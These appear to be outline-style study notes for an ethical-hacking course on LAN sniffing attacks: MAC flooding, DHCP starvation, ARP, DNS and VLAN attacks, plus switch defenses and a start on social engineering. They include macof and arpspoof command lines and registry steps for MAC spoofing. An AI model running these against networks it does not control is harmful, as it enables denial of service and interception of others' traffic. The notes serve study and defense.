				- macof is a Unix/Linux tool included in the dsniff collection. It floods the local network with random MAC and IP addresses, causing certain switches to fail and enter repeating (fail-open) mode, which facilitates traffic sniffing. The tool overwhelms the switch’s CAM tables by sending forged MAC entries at a rate of approximately 131,000 per minute. Once the MAC table is full and the switch switches to hub-like behavior, an attacker can intercept and monitor the broadcasted data.
				- macof -i eth0 -n 10
			- Switch Port Stealing:
				- The switch port stealing sniffing technique uses MAC flooding to intercept packets. The attacker floods the switch with forged gratuitous ARP packets, using the target MAC address as the source and the attacker’s own MAC address as the destination. This causes a race condition between the attacker’s flooded packets and the target host’s packets, forcing the switch to constantly update its MAC address table, binding the target MAC address to multiple ports.
				- If the attacker acts quickly, they can redirect packets intended for the target host to their own switch port. At this point, the attacker "steals" the target host's switch port and sends an ARP request to discover the target host’s IP address. When the attacker receives an ARP reply, it indicates that the target host’s switch port binding has been restored, and the attacker can now sniff the packets sent to the targeted host.
			- Defending Against MAC Attacks:
				- Defending Against MAC Attacks with Port Security:
					- Port security limits MAC address access to a switch port. By assigning secure MAC addresses to a port, only packets with matching source MAC addresses are allowed. - A security violation occurs if:
						- The maximum number of secure MAC addresses is reached
						- A machine tries to access the port with an unrecognized MAC address
					- Secure MAC addresses can be configured in three ways:
						- Manually via the switch port configuration
						- Dynamically, based on connected devices’ MAC addresses
						- A mix of static and dynamic configurations
					- Port security helps prevent MAC flooding attacks by limiting the number of allowed MAC addresses and locking down the port, sending an SNMP trap when a violation occurs.
				- Configuring Port Security on Cisco Switch:
					- interface interface_id : Enter interface configuration mode and select the physical interface to configure (e.g., gigabitethernet 3/1).
					- switchport mode access : Set the interface mode to access. By default, an interface in dynamic desirable mode cannot be configured as a secure port.
					- switchport port-security : Enable port security on the selected interface.
					- switchport port-security maximum {1-3072} : Sets the maximum number of secure MAC addresses allowed on the interface. The range is 1 to 3072, with a default of 1.
					- switchport port-security violation {restrict | shutdown} : Configures the violation mode, specifying the action to be taken when a security violation is detected. Options are {restrict | shutdown}.
					- switchport port-security limit rate invalid-source-mac : Sets the rate limit for invalid packets (those with unauthorized MAC addresses).
					- switchport port-security mac-address mac_address : Manually enters a secure MAC address for the interface. This can be used to limit the number of secure MAC addresses.
					- switchport port-security mac-address sticky : Enables sticky learning for the first MAC address on the interface, allowing it to be added dynamically to the secure MAC address table.
					- end : Exits interface configuration mode and returns to privileged EXEC mode.
					- show port-security address / show port-security address interface interface_id : Verifies the port security configuration and displays the secure MAC addresses associated with the interface.
					- switchport port-security aging time 2 : Configures the aging time for secure MAC addresses on the port.
					- switchport port-security aging type inactivity : Sets the secure MAC address aging type to "inactivity," meaning the address will be aged out if inactive.
					- snmp-server enable traps port-security trap-rate 5 : Controls the rate at which SNMP traps are generated for port security events.
		- DHCP Attack:
			- Dynamic Host Configuration Protocol (DHCP):
				- DHCP enables communication on an IP network by automatically configuring network devices. It assigns IP addresses and other information to devices, enabling them to communicate on the network in a client-server model.
				- DHCP serves two primary functions: delivering host-specific configuration parameters and allocating network addresses to hosts. Communication between DHCP servers and clients is carried out through a series of DHCP messages.
				- DHCP is a client-server protocol that automatically assigns an IP address to an IP host. In addition to the IP address, the DHCP server provides configuration information, such as the default gateway and subnet mask.
				- When a DHCP client device boots up, it initiates communication by broadcasting traffic to discover available DHCP servers on the network. This process allows DHCP to dynamically assign IP configurations to hosts connecting to a network, streamlining the administrative task of managing IP networks.
				- DHCP servers maintain TCP/IP configuration information in a database, which includes valid TCP/IP configuration parameters, available IP addresses, and the lease durations offered by the server. The server provides address configurations to DHCP-enabled clients in the form of lease offers.
			- DHCP Starvation Attack:
				- In a DHCP starvation attack, an attacker floods the DHCP server with numerous DHCP requests, exhausting all the available IP addresses that the server can allocate. As a result, the server becomes unable to issue additional IP addresses, leading to a DoS attack. Consequently, legitimate users are unable to obtain or renew their IP addresses and fail to access the network. The attacker achieves this by broadcasting DHCP requests with spoofed MAC addresses, using tools such as Yersinia, Hyenae, and Gobbler.
				- DHCP starvation attack tools send a large number of requests to a DHCP server, leading to exhaustion of the server’s address pool. Subsequently, the DHCP server is unable to allocate configurations to new clients.
				- DHCP Starvation Attack Tools:
					- Yersinia : Yersinia is a network tool designed to exploit vulnerabilities in various network protocols, such as DHCP. It serves as a robust framework for analyzing and testing deployed networks and systems.			
					- dhcpStarvation.py (github.com)
					- Metasploit (www.metasploit.com)
					- Hyenae (sourceforge.net)
					- DHCPig (github.com)
			- Rogue DHCP Server Attack:
				- This attack works alongside a DHCP starvation attack. After exhausting the DHCP server’s IP address pool, an attacker sets up a rogue DHCP server on the network, impersonating a legitimate server. The rogue server assigns IP addresses and network information to clients, acting as the default gateway. Clients receiving configurations from the rogue server become vulnerable to attacks such as MITM, as their traffic is routed through the attacker’s server.
				- The rogue DHCP server competes with the legitimate DHCP server to respond to clients’ discovery requests. If the rogue server responds faster, the client accepts its response, potentially disrupting network access or causing a DoS attack. The rogue server can capture and forward client traffic, making the attack difficult to detect. Additionally, it can direct clients to fake websites to steal credentials.
				- To mitigate rogue DHCP server attacks, designate interfaces connected to unauthorized servers as untrusted. This blocks all incoming DHCP server messages from such interfaces, preventing malicious configurations.
				- DHCP Attack Tools:
					- mitm6 (github.com)
					- Ettercap (www.ettercap-project.org)
					- Gobbler (sourceforge.net)
			- Defend Against DHCP Starvation and Rogue Server Attacks:
				- Defend Against DHCP Starvation:
					- Enable port security to protect against DHCP starvation attacks. Port security limits the maximum number of MAC addresses allowed on a switch port. When this limit is exceeded, the switch drops subsequent packets from additional MAC addresses, safeguarding the server from DHCP starvation attacks.
					- IOS Switch Commands: The Internetwork Operating System (IOS) provides a comprehensive set of switch commands used to configure, manage, and troubleshoot Cisco network switches effectively.
				- Defend Against Rogue Server Attack:
					- The DHCP snooping feature available on switches helps mitigate rogue DHCP servers. It is configured on the port where the valid DHCP server is connected. Once configured, DHCP snooping prevents other ports on the switch from responding to DHCP Discover packets sent by clients. As a result, even if an attacker manages to set up a rogue DHCP server and connects it to the switch, it will not be able to respond to DHCP Discover packets.
					- IOS Global Commands: IOS Global Commands are a set of commands that can be configured at the global level in Cisco devices; can be used to defend against rogue server attacks by configuring security features, such as DHCP snooping and port security, to prevent unauthorized servers from responding to client requests and compromising the network.
					- MAC Limiting Configuration on Juniper Switches: MAC Limiting Configuration on Juniper switches is a security feature that restricts the number of MAC addresses learned on a port, preventing unauthorized devices from connecting and protecting the network from MAC flooding attacks and unauthorized access.
					- Configuring DHCP Filtering on Switch: DHCP filtering allows administrators to control whether traffic is forwarded between trusted nodes. When DHCP filtering is applied, the switch verifies the legitimacy of DHCP packets/messages before forwarding them to the client. With this filtering, the client can receive the correct port number and IP address from the legitimate DHCP server.
		- ARP Poisoning:
			- Address Resolution Protocol (ARP):
				- The ARP is a stateless TCP/IP protocol that maps IP addresses to hardware addresses (MAC addresses) used by a data link protocol. It resolves IP addresses to MAC addresses to enable communication within a network. In addition to switches, host machines also use ARP to obtain MAC addresses.
				- A host machine uses ARP when it needs to send a packet to another device. The host must specify the destination MAC address in the packet. The operating system maintains an ARP table, which is populated with information from responses to ARP requests. This table maps IP addresses to their corresponding MAC addresses, facilitating efficient communication within the network.
				- The process of obtaining a MAC address using ARP begins with the source machine sending an ARP request containing its own MAC and IP addresses along with the destination IP address to the switch. The switch updates its CAM table with the source MAC and port; if the MAC address is not already in the table, it adds the entry and broadcasts the ARP request to the network. Each device on the network compares the destination IP in the request with its own IP address. The device with the matching IP sends an ARP reply back to the switch, which updates its CAM table with the responder's MAC and forwards the reply to the source machine. The source then updates its ARP table with the responder's MAC address, enabling communication between the devices.
			- ARP Spoofing Attack:
				- ARP spoofing is a method used to attack an Ethernet LAN. ARP resolves IP addresses to MAC (hardware) addresses of interfaces to enable data transmission. However, ARP packets can be forged to redirect data to an attacker’s machine. ARP spoofing involves constructing a large number of forged ARP request and reply packets to overload a switch.
				- When a machine sends an ARP request, it assumes the ARP reply comes from the correct device. However, ARP lacks any mechanism to verify the authenticity of the responding device. Even systems that have not sent an ARP request can accept unsolicited ARP replies from other devices. Attackers exploit this flaw by crafting malformed ARP replies containing spoofed IP and MAC addresses. Assuming the reply is legitimate, the victim's computer adds the spoofed entry to its ARP table.
				- Once the ARP table is populated with these spoofed entries, the switch enters forwarding mode, allowing the attacker to intercept all data flowing from the victim's machine without their awareness. This technique is also referred to as ARP cache poisoning.
				- ARP spoofing serves as a precursor for attacks such as DoS, MITM, and session hijacking. When a legitimate user initiates a session with another user within the same Layer 2 broadcast domain, the switch broadcasts an ARP request using the recipient's IP address. The sender waits for the recipient to respond with a MAC address. An attacker listening on this unprotected Layer 2 broadcast domain can intercept the request and reply by spoofing the intended recipient’s IP address.
				- The attacker may also run a packet sniffer and configure the machine’s NIC to promiscuous mode, enabling them to capture all network traffic.
			- Threats of ARP Poisoning:
				- Packet Sniffing: Capturing and analyzing network traffic, often to extract sensitive information.
				- Session Hijacking: Stealing valid session information to gain unauthorized access to an application.
				- VoIP Call Tapping: Exploiting port mirroring to monitor all network traffic and selectively record VoIP traffic based on MAC addresses.
				- Manipulating Data: ARP spoofing enables attackers to capture and modify data or disrupt the flow of traffic.
				- Man-in-the-Middle (MITM) Attack: The attacker positions themselves between the victim and the server to intercept and potentially alter communication.
				- Data Interception: Captures IP addresses, MAC addresses, and VLAN information connected to a network switch.
				- Connection Hijacking: Exploits the flexibility of hardware addresses, which are meant to be unique and fixed. If a host changes its hostname or protocol, an attacker can manipulate the connection, taking complete control of a client’s session.
				- Connection Resetting: Incorrect routing information caused by hardware or software errors can disrupt connections. If a host fails to initiate a connection, it should inform the Address Resolution module to delete its entry. Data reception from the host will reset the connection timeout in the ARP table. If the host remains inactive for a certain period, the ARP entry is deleted automatically.
				- Stealing Passwords: Attackers use forged ARP replies to trick target hosts into sending sensitive information, such as usernames and passwords.
				- DoS Attack: Attackers associate multiple IP addresses with a single MAC address of the target host, overwhelming it with traffic and causing service disruptions.
			- ARP Spoofing/ Poisoning Tools:
				- arpspoof:
					- arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.
					- arpspoof –i [Interface] –t [Target Host]
				- Habu:
					- Habu is a versatile hacking toolkit that offers various commands to perform a wide range of attacks and analyses. Its capabilities include ARP poisoning and traffic sniffing, DHCP discovery and starvation, subdomain identification, certificate cloning, TCP analysis (including ISN and flags), username verification on social networks, and web technology identification.

			- Defend Against ARP Poisoning:
				- Implement Dynamic ARP Inspection Using DHCP Snooping Binding Table:
					- Dynamic ARP Inspection (DAI) prevents ARP poisoning by validating ARP packets in a network. When enabled on a VLAN, all ports are untrusted by default, and DAI uses the DHCP snooping binding table to verify MAC-IP bindings. DHCP snooping must be activated first, as it collects MAC addresses, IP addresses, and VLAN interfaces by monitoring DHCP exchanges. Without it, ARP-based communication between VLAN devices may fail, potentially causing a self-imposed DoS.
					- DAI inspects ARP packets against the snooping database and discards those with invalid bindings, reducing MITM attack risks. For networks with static IPs or switches without DAI, static mapping of IP-MAC pairs can be used to mitigate attacks. Custom scripts can also monitor ARP tables, comparing current entries against known MAC-IP pairs to detect mismatches and drop malicious packets. These methods safeguard servers and gateways from ARP poisoning.
				- Configuring DHCP Snooping and Dynamic ARP Inspection on Cisco Switches:
					- Dynamic ARP Inspection (DAI) requires DHCP snooping to be enabled first. DHCP snooping is a security feature that builds a binding table by tracking IP-to-switch-port mappings and filters untrusted DHCP messages. It inspects DHCP traffic at the Layer 2 level, ensuring secure IP allocation.
					- To configure DHCP snooping, enable it both globally and for the desired VLANs. Once DHCP snooping is active, DAI can be configured to validate ARP packets and prevent ARP poisoning attacks.

		- MAC Spoofing/Duplicating:
			- MAC Spoofing/duplicating refers to the spoofing a MAC address with the MAC address of a legitimate user on the network. A MAC duplicating attack involves monitoring a network for the MAC addresses of legitimate clients that are connected. A MAC duplicating attack is launched by sniffing the network for the MAC addresses of clients actively associated with a switch port and then reusing one of those addresses. By intercepting the traffic on the network, a malicious user can spoof a legitimate user’s MAC address and receive all traffic intended for that user.
			- In this attack, the attacker first identifies the MAC addresses of clients that are actively connected to a switch port. The attacker then spoofs one of those MAC addresses, impersonating the legitimate client. If the spoofing is successful, the attacker can intercept all traffic destined for the legitimate client. As a result, the attacker gains unauthorized access to the network and can impersonate someone else. This technique may also be used to bypass MAC filtering on wireless access points.
			- MAC Spoofing Technique (Windows):
				- Method 1: Changing the MAC Address Using the Network Interface Card's Clone MAC Address Feature
					- If network interface card supports cloning the MAC address, follow these steps:
					- Open Control Panel: Go to Network and Sharing Center under Network and Internet
					- Access Ethernet Properties: Click Ethernet connection -> Properties -> Configure
					- Set the MAC Address: In the Advanced tab, select Network Address, enter the new MAC address without colons (e.g., 001A2B3C4D5E), and click OK
					- Verify Changes: Use ipconfig/all or net config rdr in Command Prompt
					- Reboot if Needed: Restart system if changes are visible; otherwise, try Method 2 (registry)
				- Method 2: Change MAC Address in the Registry
					- Open Registry Editor: Press Win + R, type regedit, and hit Enter
					- Navigate to Key: Go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}
					- Find the Adapter: Look for subkeys (0000, 0001, etc.) and check DriverDesc to identify the correct adapter
					- Add NetworkAddress: Right-click the subkey -> New -> String Value, name it NetworkAddress, and modify it to enter the new MAC address (e.g., 001A2B3C4D5E)
					- Apply Changes: Disable and re-enable the adapter or reboot the system
			- MAC Spoofing Tools:
				- MAC Address Changer : MAC Address Changer is a lightweight application that allows users to change or spoof the MAC address of network adapters. It is often utilized in network-related activities, including testing network security or simulating different devices. The tool can generate a randomized MAC address and restore the original address when needed.

				- Technitium MAC Address Changer (TMAC) (technitium.com)
				- Change MAC Address (lizardsystems.com)
				- Mac Changer (github.com)
				- Automatic Media Access Control Address Spoofing Tool (AMC) (github.com)
			- Defend Against MAC Spoofing:
				- DHCP Snooping Binding Table: DHCP snooping filters untrusted DHCP messages and builds a DHCP binding table. This table includes MAC addresses, IP addresses, lease times, binding types, VLAN numbers, and interface information, corresponding to untrusted switch interfaces. It acts as a firewall between untrusted hosts and DHCP servers, helping to differentiate between trusted and untrusted interfaces.
				- Dynamic ARP Inspection (DAI): This system checks the IP–MAC address binding for each ARP packet. During DAI, the system automatically drops packets with invalid IP–MAC address bindings.
				- IP Source Guard: IP Source Guard restricts IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database. It prevents spoofing attacks when an attacker attempts to spoof or use another host's IP address.
				- Encryption: Encrypt communications between access points and devices to prevent MAC spoofing. Use secure encryption protocols like WPA3 to protect against MAC address spoofing, which can occur through traffic interception and manipulation.
				- Retrieving MAC Address: Always retrieve the MAC address directly from the Network Interface Card (NIC), rather than from the operating system.
				- IEEE 802.1X Implementation: This network protocol enforces port-based Network Access Control (PNAC), controlling access to the network at the entry point where users join.
				- AAA (Authentication, Authorization, and Accounting): Implement AAA servers to filter MAC addresses, ensuring secure authentication and monitoring.
				- Network Access Control (NAC): NAC systems enforce security policies on devices attempting to access the network. It can detect and prevent unauthorized access due to MAC spoofing.
				- Rate Limiting and Traffic Analysis: Implement rate limiting on network devices to mitigate the effects of MAC flooding attacks.
				- Regular Network Audits and Security Assessments: Conduct regular network audits to identify unknown devices, unexpected traffic patterns, and non-compliance with security policies. This helps identify potential vulnerabilities before they can be exploited.
				- Port Security: Configure port security on switches to limit the number of allowed MAC addresses per port and specify permitted MAC addresses, enhancing security.
		- IRDP Spoofing:
			- ICMP Router Discovery Protocol (IRDP) is a routing protocol that enables a host to discover the IP addresses of active routers on its subnet by processing router advertisement and solicitation messages. Attackers can exploit this protocol to remotely add default route entries on a system by spoofing router advertisement messages.
			- Since IRDP does not require authentication, the target host prioritizes the attacker-defined default route over the one provided by the DHCP server. Attackers achieve this by setting a high preference level and route lifetime, ensuring that the target host selects it as the preferred route.
			- This attack is only possible if the attacker is on the same network as the victim. On Windows systems configured as DHCP clients, the OS validates received router advertisements. If only one entry is present, Windows checks whether the source IP is within the subnet. If it is, the default route is added; otherwise, the advertisement is ignored.
			- By sending spoofed IRDP router advertisements, attackers can redirect all data packets through their system. This enables them to sniff traffic and extract sensitive information.
			- IRDP spoofing can facilitate various attacks:
				- Passive Sniffing: In switched networks, attackers reroute outbound traffic from target hosts through their machine, enabling traffic interception.
				- MITM (Man-in-the-Middle): Attackers intercept and act as a proxy between victims and destinations, potentially modifying traffic.
				- DoS (Denial of Service): Attackers add incorrect route entries to the victim’s routing table, disrupting network communication.
			- To prevent IRDP spoofing attacks, disable IRDP on hosts if the operating system supports/allows it.
		- VLAN Hopping:
			- VLAN hopping is a network attack technique used to gain unauthorized access to resources on a Virtual Local Area Network (VLAN). The goal of a VLAN hopping attack is to access traffic from other VLANs within the same network, which is otherwise inaccessible. Such attacks often exploit poor VLAN implementations or misconfigurations.
			- This attack bypasses network segmentation controls designed to isolate traffic for security and management purposes. Attackers use VLAN hopping to steal sensitive information (e.g., passwords), modify, corrupt, or delete data, install malicious code or programs, or spread malware such as viruses, Trojans, and worms throughout the network.
			- VLAN Hopping Methods:
				- Switch Spoofing:
					- Switch Spoofing is an attack where an attacker connects a rogue switch to the network, tricking a legitimate switch into creating a trunk link between them. Once the trunk link is established, traffic from multiple VLANs can be sent through the rogue switch, enabling the attacker to sniff and view the packet content.
					- This attack is successful only if the legitimate switch is configured to negotiate trunk connections or if its interface is set to modes like “dynamic auto,” “dynamic desirable,” or “trunk.”
				- Double Tagging:
					- Double Tagging is an attack where an attacker adds and manipulates tags in an Ethernet frame to enable traffic flow through any VLAN in the network. The attacker sends an Ethernet frame containing two 802.1Q tags: an outer tag corresponding to the attacker’s native VLAN and an inner tag for the target VLAN the attacker wants to access.
					- When the switch receives the frame, it removes the outer tag (as it matches the native VLAN) and forwards the frame with the inner tag intact to all trunk interfaces. This allows the attacker to bypass VLAN segmentation, jumping from their native VLAN to the target VLAN and sending traffic to other VLANs.
					- This attack is only possible if the switch ports are configured to use native VLANs.
			- Defend Against VLAN Hopping:
				- Configuring a Switch to Prevent Switch Spoofing Attacks:
					- Explicitly configure the ports as access ports and ensure that they are set not to negotiate trunks.
					- Ensure that all trunk ports are explicitly configured to prevent trunk negotiation.
				- Configuring a Switch to Prevent Double Tagging Attacks:
					- Specify a default VLAN to be used if an interface stops trunking.
					- Change the native VLANs on all trunk ports to an unused VLAN ID.
					- Explicitly tag the native VLANs on all trunk ports.
					- Use Private VLANs: Configure private VLANs to isolate ports within the same VLAN from each other.
					- Regularly Audit and Monitor VLAN Configurations: Perform regular audits of VLAN and switch configurations to ensure compliance with security policies.
		- STP Attack:
			- In a Spanning Tree Protocol (STP) attack, attackers connect a rogue switch to the network to change the STP operation and sniff all network traffic. STP is used in LAN-switched networks to prevent network loops and ensure optimized traffic paths, enhancing overall network performance. In this process, one switch is designated as the root bridge, and other switches select a root port, the port closest to the root bridge.
			- The root bridge is selected using Bridge Protocol Data Units (BPDUs), which include an identification number known as a Bridge ID (BID). The BID is composed of a Bridge Priority and the MAC address. By default, the Bridge Priority value is 32769.
			- If an attacker gains access to two switches, they can configure the rogue switch to have a lower priority than any other switch in the network, making it the root bridge. This allows the attacker to intercept and sniff all network traffic.
			- Defend Against STP Attacks:
				- To Prevent an STP Attack, the Following Security Features Should Be Implemented:
				- BPDU Guard : Enable BPDU guard on ports that should never receive a BPDU from connected devices. This feature prevents the transmission of BPDUs on PortFast-enabled ports, helping avoid potential bridging loops in the network. If BPDU guard is enabled on a switch interface and an unauthorized switch sends a BPDU, the port will enter errdisable mode, shutting it down and disabling it from sending or receiving traffic.
				- Root Guard : Root guard protects the root bridge by ensuring it remains as the root in the STP topology. It forces interfaces to become designated ports (forwarding ports) to prevent nearby switches from becoming the root switch. If a port with root guard enabled receives a superior BPDU, it moves into a "loop inconsistent" state (not errdisabled), thus preventing an STP topology change. The port remains down only for the specific switch or switches attempting to change the STP topology, and stays down until the issue is resolved.
				- Loop Guard : Loop guard enhances network stability by preventing bridging loops, often protecting against malfunctioning switches.
				- UDLD (Unidirectional Link Detection) : UDLD detects unidirectional links and disables the affected interfaces in the network. These unidirectional links can cause STP topology loops.
				- Deploy PortFast : Apply PortFast to all access ports to reduce the time spent in the listening and learning STP states. However, ensure BPDU Guard is enabled to mitigate risks.
				- Regularly Update and Patch Network Devices : Keep the firmware and software of network devices up to date to protect against known vulnerabilities.
				- Restrict Network Access : Limit physical access to network ports and devices to prevent unauthorized STP configuration changes.
				- Network Segmentation : Reduce the scope of STP attacks by dividing larger broadcast domains into smaller, more manageable segments.
		- DNS Poisoning:
			- DNS is a protocol that translates domain names (e.g., www.eccouncil.org) into IP addresses (e.g., 208.66.172.56). It uses DNS tables, which store domain names and their corresponding IP addresses in a distributed database.
			- DNS poisoning, also known as DNS spoofing, occurs when an attacker deceives a DNS server into accepting false information as legitimate. This allows the attacker to redirect victims to a malicious server instead of the intended one.
			- The attacker achieves this by manipulating DNS table entries, substituting a legitimate IP address with a fraudulent one at the DNS level, where domain names are resolved into numeric IP addresses. They may also create fake DNS entries for the malicious server, using domain names identical to the target server.
			- As a result, the victim unknowingly connects to the attacker’s server. Once the connection is established, the attacker can compromise the victim’s system, steal sensitive data, or perform further malicious actions.
			- DNS Poisoning Techniques:
				- Intranet DNS Spoofing
					- An attacker can perform an intranet DNS spoofing attack on a switched LAN using the ARP poisoning technique. To execute this attack, the attacker must be connected to the LAN and able to sniff network traffic or packets. By intercepting the DNS request ID from the intranet, the attacker can send a malicious reply to the sender faster than the legitimate DNS server, redirecting the victim to a malicious destination.
					- The attacker uses tools like arpspoof or dnsspoof to poison the router and redirect DNS requests from clients to the attacker’s machine. When a client sends a DNS request to the router, the compromised router forwards the request to the attacker’s machine. The attacker then responds with a fake DNS reply, redirecting the client to a fraudulent website controlled by the attacker.
					- On this fake website, the attacker can capture all information submitted by the client, such as passwords or other sensitive data. After extracting the required information, the attacker may redirect the client to the legitimate website to avoid suspicion.
				- Internet DNS Spoofing:
					- Internet DNS poisoning, also known as remote DNS poisoning, allows attackers to perform DNS spoofing attacks on one or multiple victims worldwide. To execute this attack, the attacker sets up a rogue DNS server with a static IP address. The attack is often facilitated using Trojans that modify the victim’s DNS settings when their system connects to the internet.
					- This attack, a form of a Man-in-the-Middle (MITM) attack, involves the attacker altering the victim’s primary DNS entries, replacing the legitimate DNS server's IP address with a fake IP address that resolves to the attacker’s system. As a result, the victim’s traffic is redirected to the attacker’s system, enabling the attacker to intercept and steal confidential information.
				- Proxy Server DNS Poisoning:
					- In the proxy server DNS poisoning technique, the attacker sets up a proxy server on their system and configures it with a fraudulent DNS, making its IP address the primary DNS entry. Using a Trojan, the attacker alters the victim's proxy server settings to route traffic through the malicious proxy.
					- The proxy server acts as the primary DNS, redirecting the victim’s traffic to a fake website controlled by the attacker. There, the attacker can intercept and steal confidential information. After capturing the data, the attacker may forward the request to the legitimate website to avoid suspicion.
				- DNS Cache Poisoning:
					- DNS cache poisoning involves altering or adding forged DNS records in a DNS resolver’s cache to redirect DNS queries to malicious sites. The DNS system uses cache memory to store recently resolved domain names and their corresponding IP addresses, enabling faster responses by avoiding repeated lookups.
					- In this attack, the attacker populates the DNS cache with forged entries, including domain names and fake IP addresses. When a user sends a request, the resolver checks its cache. If the requested domain is found, the resolver quickly returns the cached entry, reducing traffic and response time.
					- Attackers exploit this mechanism by injecting false entries into the cache. If the DNS resolver cannot verify that a response came from an authoritative source, it caches the incorrect entries locally and serves them to users making the same request. As a result, the resolver replaces the legitimate IP address with a fake one. When users request the poisoned domain, the resolver directs them to the attacker’s malicious server instead of the intended one.
					- SAD DNS Attack:
						- SAD DNS is a modern variant of DNS cache poisoning, where attackers inject malicious DNS records into a DNS cache to redirect traffic to their own servers. This technique allows attackers to deceive client browsers, leading them to fake websites containing malicious content instead of legitimate ones.
						- Attackers exploit side channels, vulnerabilities in DNS resolvers like dnsmasq, unbound, and BIND on newer operating systems, and outdated DNS software used for resolving queries to carry out SAD DNS attacks.
			- DNS Poisoning Tools:
				- DerpNSpoof : DerpNSpoof is a DNS poisoning tool used to spoof DNS query packets for a specific IP address or a group of hosts within a network. Attackers can use this tool to create a list of fake DNS records and load it during execution to redirect victims to malicious or unintended websites.
				- dnsspoof : dnsspoof is a DNS spoofing tool that intercepts DNS responses from a router and replaces them with forged DNS responses.
				- arpspoof : arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.

	- Defend Against Sniffing:
		- Countermeasures to Defend Against Sniffing:
			- Restrict physical access to network media to prevent the installation of packet sniffers.
			- Use end-to-end encryption to protect confidential information.
			- Permanently add the MAC address of the gateway to the ARP cache.
			- Use static IP addresses and ARP tables to prevent attackers from adding spoofed ARP entries to the network.
			- Disable network identification broadcasts and restrict the network to authorized users to prevent discovery via sniffing tools.
			- Use IPv6 instead of IPv4, as IPsec is optional in IPv4 but mandatory in IPv6.
			- Employ switches instead of hubs, as switches deliver data only to the intended recipient.
			- Utilize security tools such as PGP, S/MIME, VPNs, IPSec, SSL/TLS, SSH, and one-time passwords (OTPs).
			- Use SNMPv3 instead of SNMPv1 or SNMPv2 for managing networked devices.
			- Encrypt wireless traffic using strong protocols such as WPA2 or WPA3.
			- Retrieve MAC addresses directly from NICs to prevent MAC address spoofing.
			- Use tools to detect NICs operating in promiscuous mode.
			- Avoid broadcasting session set identifiers (SSIDs).
			- Implement a MAC filtering mechanism on routers.
			- Deploy network scanning and monitoring tools to detect malicious intrusions, rogue devices, and sniffers.
			- Avoid accessing unsecured or open Wi-Fi networks.
			- Use VLANs and network segmentation to divide the network into smaller, secure segments, limiting the scope for sniffers.
			- Regularly monitor and audit network traffic for unusual patterns indicative of sniffing activities.
		- Detect Sniffing:
			- Detecting a sniffer is difficult as it only captures data in promiscuous mode, without transmitting any traffic. Promiscuous mode allows a network device to intercept all packets, bypassing destination address validation. To detect sniffers, check for systems in promiscuous mode. Standalone sniffers are hard to detect, but reverse DNS lookup can help identify non-standalone sniffers.
			- Sniffer Detection Methods:
				- Ping Method:
					- To detect a sniffer on a network, identify systems running in promiscuous mode. The ping method can help identify systems in promiscuous mode, which in turn can reveal sniffers installed on the network.
					- Send a ping request to the suspected machine using its IP address and an incorrect MAC address. The Ethernet adapter will reject the packet because the MAC address does not match. However, a machine running a sniffer will respond, as it does not reject packets with a different MAC address. This response can help identify the sniffer on the network.
				- DNS Method:
					- The reverse DNS lookup is the opposite of the standard DNS lookup method. Sniffers that perform reverse DNS lookups can increase network traffic, which may indicate their presence. This increased traffic suggests that computers on the network are in promiscuous mode.
					- Reverse DNS lookups can be performed remotely or locally. To detect them, monitor the organization’s DNS server for incoming reverse DNS lookups. Another method is to send ICMP requests to a non-existing IP address. The machine performing the reverse DNS lookup will respond to the ping, thus identifying it as hosting a sniffer.
					- For local reverse DNS lookups, configure the detector in promiscuous mode. Send an ICMP request to a non-existing IP address and check the response. If the system responds, it indicates that the machine is performing reverse DNS lookups locally. A machine generating reverse DNS lookup traffic is likely running a sniffer.
				- ARP Method:
					- This technique sends a non-broadcast ARP request to all nodes on the network. The node running in promiscuous mode will cache the local ARP address and then broadcast a ping message using the local IP address but a different MAC address. Only the node with the cached MAC address will respond to the broadcast ping request.
					- A machine in promiscuous mode will reply to the ping message because it has the correct information about the host in its cache, while other machines will send an ARP probe to identify the source of the ping request. This process helps detect the node where the sniffer is running.

# Social Engineering

- Social engineering is the art of manipulating and convincing individuals to disclose confidential information. Social engineers exploit the fact that people are often unaware of the value of the information they possess and may be careless about safeguarding it. By using social engineering tactics, attackers can deceive individuals and exploit human vulnerabilities to gain access to sensitive information, authorizations, and credentials.
- Before conducting a social engineering attack, the attacker collects information about the target organization from various sources:
	- The organization’s official websites, where details such as employee IDs, names, and email addresses may be publicly available.
	- Advertisements published through media, which may reveal information about the organization’s products, services, and offers.
	- Blogs, forums, and other online platforms where employees might share personal or organizational details.
- Once sufficient information has been gathered, the attacker carries out social engineering attacks using techniques such as impersonation, piggybacking, tailgating, reverse social engineering, and other methods.
- Types of Social Engineering:
	- Human-based Social engineering:
		- Impersonation: The attacker pretends to be a legitimate or authorized individual. This impersonation can be carried out in person or through communication channels such as phone, email, or other mediums. By impersonating someone trustworthy, attackers can deceive their targets into disclosing sensitive information.
		- Vishing: Vishing (voice or VoIP phishing) is an impersonation technique used in electronic fraud, where the attacker manipulates individuals into revealing personal and financial information through voice technology, such as telephone systems or VoIP. The attacker often employs caller ID spoofing to forge identification.
		- Eavesdropping: The unauthorized listening to conversations or reading of messages. It involves intercepting audio, video, or written communications through channels such as telephone lines, email, instant messaging, and other forms of communication.
		- Shoulder Surfing: A direct observation technique involving watching over someone's shoulder to obtain sensitive information, such as passwords, PINs, or account numbers. This can also be carried out from a distance using vision-enhancing tools such as binoculars.
		- Dumpster Diving: The act of searching through someone else’s trash to find valuable information. This technique involves retrieving items such as phone bills, contact details, financial records, operational documents, or other sensitive information from a target company’s trash bins, printer bins, or user desks (e.g., sticky notes).
		- Reverse Social Engineering: The attacker poses as an authority figure, prompting the target to seek their advice. During this process, the target may willingly provide the information the attacker is attempting to obtain.
		- Piggybacking: An unauthorized individual gains access to a secure area by being intentionally or unintentionally allowed entry by an authorized person. For example, the unauthorized person might say, “I forgot my ID badge at home. Please help me.”
		- Tailgating: The attacker, often wearing a fake ID badge, gains access to a secured area by closely following an authorized person through a door that requires key access.
		- Diversion Theft: The attacker deceives a delivery person into rerouting a genuine consignment to a location other than the intended destination.
		- Honey Trap: Attackers target an individual within a company by pretending to be an attractive person online. They initiate a fake online relationship to extract confidential information about the target company. In some cases, attackers lure end users with enticing offers in exchange for critical information such as login credentials and other sensitive data.
